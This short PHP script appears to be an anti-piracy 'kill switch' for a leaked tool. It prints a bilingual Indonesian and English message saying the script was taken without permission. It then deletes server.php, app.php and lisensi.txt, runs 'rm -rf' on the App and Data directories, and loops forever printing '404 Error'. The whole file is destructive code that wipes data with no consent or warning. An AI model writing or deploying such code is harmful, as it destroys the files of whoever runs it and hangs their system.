<?php
init();
$tod="404 Error";
$i =" ".o.$tod;
print p." Bahasa : ".o."script belum di publisakan tetapi di ambil oleh orang yang tidak dengan ijin".n.n;
print p." English : ".o."The script has not been published yet but it was taken by someone without permission".n;
unlink("server.php");
unlink("app.php");
unlink("lisensi.txt");
system("rm -rf App");
system("rm -rf Data");
tim(10);
while(true){
  print $i;
}

